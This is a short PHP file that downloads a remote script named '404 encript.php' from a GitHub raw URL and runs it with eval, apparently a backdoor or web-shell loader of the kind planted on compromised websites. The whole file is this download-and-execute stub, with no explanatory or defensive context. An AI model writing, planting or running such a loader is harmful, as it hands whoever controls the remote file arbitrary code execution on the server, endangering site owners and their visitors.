<?php
$ch = curl_init('https://raw.githubusercontent.com/prokontra/prokontra/main/404%20encript.php');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);
?>
